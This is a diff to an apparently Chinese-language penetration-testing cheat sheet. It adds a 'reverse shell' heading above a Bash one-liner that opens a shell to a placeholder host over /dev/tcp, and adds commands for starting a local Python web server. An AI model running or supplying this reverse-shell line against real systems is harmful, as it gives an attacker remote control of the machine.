@@ -1,4 +1,6 @@
 
+## 反弹shell
+
 Bash反弹shell
 ```bash
 /bin/bash -c bash -i >& /dev/tcp/x.x.x.x/12345 0>&1
@@ -45,3 +47,15 @@ while(1):
     except :
         contiune'''
 ```        
+
+
+## 开启本地网络
+
+python:
+
+```python
+2
+python -m SimpleHTTPServer 8080
+3
+python3 -m http.server
+```
